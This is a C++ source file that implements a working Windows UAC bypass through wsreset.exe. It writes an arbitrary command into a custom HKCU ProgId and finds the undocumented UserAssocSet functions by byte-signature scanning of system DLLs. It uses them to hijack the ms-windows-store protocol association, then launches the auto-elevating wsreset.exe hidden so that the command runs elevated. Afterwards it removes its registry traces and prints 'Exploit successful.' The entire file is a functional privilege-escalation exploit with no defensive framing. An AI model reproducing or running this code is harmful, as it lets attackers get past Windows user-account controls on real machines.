#include "WSReset.h"

using UserAssocSetPtr = void(WINAPI*)(int unknown0, PCWCHAR fileType, PCWCHAR progId);
using UserAssocSetInternalPtr = HRESULT(WINAPI*)(void* unused0, PCWCHAR fileType, PCWCHAR progId, int unknown0);

const BYTE SIGNATURE_NT10[] = {
	0x48, 0x8B, 0xC4, 0x55, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x68, 0xA1, 0x48, 0x81, 0xEC, 0xA0,
	0x00, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xEF, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x20
};

const BYTE SIGNATURE_NT6X[] = {
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0xFE, 0xFF,
	0xFF, 0x48, 0x81, 0xEC, 0x80, 0x02, 0x00, 0x00
};

template <typename T>
T LocateSignature(const BYTE signature[], const int signatureSize, const char* sectionName, const HMODULE moduleHandle)
{
	auto* headers = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<PUCHAR>(moduleHandle) + reinterpret_cast<
		PIMAGE_DOS_HEADER>(moduleHandle)->e_lfanew);
	auto* sectionHeader = IMAGE_FIRST_SECTION(headers);

	while (std::strcmp(sectionName, reinterpret_cast<char*>(sectionHeader->Name)) != 0)
		sectionHeader++;

	for (auto* i = reinterpret_cast<PUCHAR>(moduleHandle) + sectionHeader->VirtualAddress; i != reinterpret_cast<
		PUCHAR>(moduleHandle) + sectionHeader->VirtualAddress + sectionHeader->SizeOfRawData - signatureSize; i++
		)
	{
		if (std::memcmp(signature, i, signatureSize) == 0)
			return reinterpret_cast<T>(i);
	}

	return reinterpret_cast<T>(nullptr);
}

struct RegistryEntry
{
	explicit RegistryEntry(const wchar_t* path, const wchar_t* deletePath) : DeletePath(deletePath)
	{
		Status = RegCreateKeyExW(HKEY_CURRENT_USER, path, 0, nullptr, REG_OPTION_NON_VOLATILE,
			KEY_SET_VALUE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | DELETE, nullptr,
			&Handle, nullptr);
	}

	~RegistryEntry()
	{
		RegCloseKey(Handle);
		RegDeleteTreeW(HKEY_CURRENT_USER, DeletePath);
	}

	LSTATUS SetValue(const wchar_t* valueName, const PVOID valueData, const DWORD valueSize) const
	{
		return RegSetValueExW(Handle, valueName, 0, REG_SZ, static_cast<const BYTE*>(valueData), valueSize);
	}

	LSTATUS GetStatus() const
	{
		return Status;
	}

private:
	HKEY Handle{};
	LSTATUS Status;
	const wchar_t* DeletePath;
};

int WSReset(char* arg)
{
	char* secret = arg;
	auto nt10{ false };

	if (*reinterpret_cast<PULONG>(0x7FFE026C) == 10)
		nt10 = true;
	else if (*reinterpret_cast<PULONG>(0x7FFE026C) == 6 && *reinterpret_cast<PULONG>(0x7FFE0270) < 2)
	{
		std::wcout << L"OS not supported.\n";
		return EXIT_FAILURE;
	}

	PWSTR systemPath;
	auto hr = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &systemPath);
	if (FAILED(hr))
	{
		std::wcout << L"SHGetKnownFolderPath() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	bstr_t b(secret);
	WCHAR* x = b;
	//std::wstring cmdLoc{ systemPath };
	//CoTaskMemFree(systemPath);
	//cmdLoc += L"\\cmd.exe /C \"start cmd.exe\"";

	const RegistryEntry progId{
		L"SOFTWARE\\Classes\\scareing\\shell\\open\\command", L"SOFTWARE\\Classes\\scareing"
	};
	if (progId.GetStatus())
	{
		std::wcout << L"RegCreateKeyExW() failed. LSTATUS: " << progId.GetStatus() << std::endl;
		return EXIT_FAILURE;
	}

	const auto status = progId.SetValue(nullptr, x, wcslen(x) * 2 + 2);
	if (status)
	{
		std::wcout << L"RegSetValueExW() failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}

	hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (FAILED(hr))
	{
		std::wcout << L"CoInitializeEx() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	if (nt10)
	{
		const auto UserAssocSetInternal = LocateSignature<UserAssocSetInternalPtr>(
			SIGNATURE_NT10, sizeof SIGNATURE_NT10, ".text",
			LoadLibraryExW(L"SystemSettings.Handlers.dll", nullptr, LOAD_LIBRARY_SEARCH_SYSTEM32));
		if (!UserAssocSetInternal)
		{
			CoUninitialize();
			std::wcout << L"SystemSettings.Handlers.dll!UserAssocSet->\"Internal\" not found.\n";
			return EXIT_FAILURE;
		}
		UserAssocSetInternal(nullptr, L"ms-windows-store", L"scareing", 1);
	}
	else
	{
		const auto UserAssocSet = LocateSignature<UserAssocSetPtr>(SIGNATURE_NT6X, sizeof SIGNATURE_NT6X, ".text",
			LoadLibraryExW(L"shell32.dll", nullptr, LOAD_LIBRARY_SEARCH_SYSTEM32));
		if (!UserAssocSet)
		{
			CoUninitialize();
			std::wcout << L"shell32.dll!UserAssocSet not found.\n";
			return EXIT_FAILURE;
		}
		UserAssocSet(2, L"ms-windows-store", L"scareing");
	}

	CoUninitialize();

	SHELLEXECUTEINFOW info{
		sizeof SHELLEXECUTEINFOW, SEE_MASK_NOCLOSEPROCESS | SEE_MASK_UNICODE, nullptr, L"open", L"wsreset.exe", nullptr,
		nullptr, SW_HIDE, nullptr, nullptr, nullptr, nullptr, NULL, nullptr, nullptr
	};

	if (!ShellExecuteExW(&info))
	{
		std::wcout << L"ShellExecuteExW() failed. GetLastError(): " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	std::wcout << L"Waiting for WSReset.exe to exit . . .\n";
	WaitForSingleObject(info.hProcess, INFINITE);
	CloseHandle(info.hProcess);
	RegDeleteTreeW(
		HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\ms-windows-store");

	auto* hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	SetConsoleTextAttribute(hStdOutput, 14);
	std::wcout << L"[";
	SetConsoleTextAttribute(hStdOutput, 15);
	std::wcout << L"%";
	SetConsoleTextAttribute(hStdOutput, 14);
	std::wcout << L"] ";
	SetConsoleTextAttribute(hStdOutput, 14);
	std::wcout << L"*** Exploit successful.\n\n";
	SetConsoleTextAttribute(hStdOutput, 7);

	return 0;
}
